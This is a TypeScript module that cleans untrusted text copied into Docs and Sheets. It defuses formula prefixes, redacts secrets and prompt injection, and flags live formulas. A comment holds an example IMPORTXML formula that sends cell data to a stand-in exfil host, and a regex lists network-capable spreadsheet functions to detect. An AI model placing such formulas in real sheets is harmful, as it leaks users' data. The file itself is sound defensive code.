import { scanOutboundSecrets, scanPromptInjection } from '@siftvane/shared';

/**
 * Taint firewall for values copied from untrusted email, PDF, or photo text into Docs and Sheets.
 *
 * Spreadsheet engines evaluate cells beginning with `=`, `+`, `-`, `@`, tab, or carriage return (and their
 * full-width forms). A vendor reply such as `=IMPORTXML("https://exfil/?d="&A1,"//a")` would otherwise
 * exfiltrate neighbouring cells the moment the operator opens the sheet. Live writes additionally use the
 * Sheets `RAW` input option, so formulas are never parsed even if a value slipped past this layer.
 */
const formulaLead = /^[\s ]*[=+\-@\t\r＝＋－＠]/;
const dangerousCall = /\b(?:IMPORTXML|IMPORTDATA|IMPORTHTML|IMPORTFEED|IMPORTRANGE|IMAGE|HYPERLINK|WEBSERVICE|FILTERXML|CMD|DDE|MSEXCEL)\s*[(|]/i;
const controls = /[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f​-‏‪-‮⁦-⁩]/g;
const numeric = /^-?\d{1,12}(?:\.\d{1,4})?$/;

export interface Sanitized<T> {
  value: T;
  flags: string[];
}

export function sanitizeCell(input: unknown): Sanitized<string | number> {
  if (typeof input === 'number') {
    return Number.isFinite(input) ? { value: input, flags: [] } : { value: '', flags: ['NON_FINITE_NUMBER'] };
  }
  const flags: string[] = [];
  let text = String(input ?? '').replace(controls, '').replace(/\r?\n/g, ' ').trim();
  if (text.length > 500) {
    text = text.slice(0, 500);
    flags.push('TRUNCATED');
  }
  if (scanOutboundSecrets(text)) return { value: '[redacted secret]', flags: [...flags, 'SECRET_REDACTED'] };
  if (scanPromptInjection(text).detected) return { value: '[redacted untrusted instruction]', flags: [...flags, 'INJECTION_REDACTED'] };
  if (dangerousCall.test(text) && !/^'/.test(text)) {
    flags.push('FORMULA_FUNCTION_NEUTRALIZED');
    text = text.replace(dangerousCall, (match) => match.replace(/\s*[(|]$/, ' ('));
  }
  if (formulaLead.test(text) && !numeric.test(text)) {
    flags.push('FORMULA_PREFIX_NEUTRALIZED');
    text = "'" + text.replace(/^[\s ]+/, '');
  }
  return { value: text, flags };
}

export function sanitizeText(input: string, max = 4000): Sanitized<string> {
  const flags: string[] = [];
  let text = input.replace(controls, '').replace(/\r\n/g, '\n');
  if (text.length > max) {
    text = text.slice(0, max);
    flags.push('TRUNCATED');
  }
  if (scanOutboundSecrets(text)) return { value: '[redacted secret]', flags: [...flags, 'SECRET_REDACTED'] };
  if (scanPromptInjection(text).detected) return { value: '[redacted untrusted instruction]', flags: [...flags, 'INJECTION_REDACTED'] };
  // Docs do not evaluate formulas, but a copied line could be pasted back into a sheet later.
  const lines = text.split('\n').map((line) => {
    if (dangerousCall.test(line) || (formulaLead.test(line) && !numeric.test(line.trim()) && !/^\s*-\s/.test(line))) {
      flags.push('FORMULA_PREFIX_NEUTRALIZED');
      return "'" + line.replace(dangerousCall, (match) => match.replace(/\s*[(|]$/, ' (')).replace(/^[\s ]+/, '');
    }
    return line;
  });
  return { value: lines.join('\n'), flags: [...new Set(flags)] };
}

export function sanitizeRows(rows: unknown[][]): Sanitized<(string | number)[][]> {
  const flags = new Set<string>();
  const value = rows.map((row) => row.map((cell) => {
    const result = sanitizeCell(cell);
    result.flags.forEach((flag) => flags.add(flag));
    return result.value;
  }));
  return { value, flags: [...flags] };
}

/** Defense in depth for the policy engine: true when any string would still be evaluated as a formula. */
export function hasLiveFormula(value: unknown): boolean {
  if (typeof value === 'string') return (formulaLead.test(value) && !numeric.test(value.trim()) && !value.startsWith("'")) ||
    (dangerousCall.test(value) && !value.startsWith("'"));
  if (Array.isArray(value)) return value.some(hasLiveFormula);
  if (value && typeof value === 'object') return Object.values(value).some(hasLiveFormula);
  return false;
}

export function flattenText(value: unknown): string {
  if (typeof value === 'string') return value;
  if (typeof value === 'number' || typeof value === 'boolean') return String(value);
  if (Array.isArray(value)) return value.map(flattenText).join('\n');
  if (value && typeof value === 'object') return Object.values(value).map(flattenText).join('\n');
  return '';
}
